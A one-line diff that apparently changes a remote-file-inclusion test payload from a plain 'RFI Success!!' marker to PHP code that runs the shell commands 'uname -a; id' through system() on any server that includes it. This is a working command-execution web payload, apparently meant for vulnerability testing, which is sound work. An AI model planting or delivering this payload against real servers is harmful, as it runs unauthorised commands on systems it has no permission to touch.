@@ -1,1 +1,1 @@
-RFI Success!!
+<pre><?php system('uname -a; id'); ?></pre>
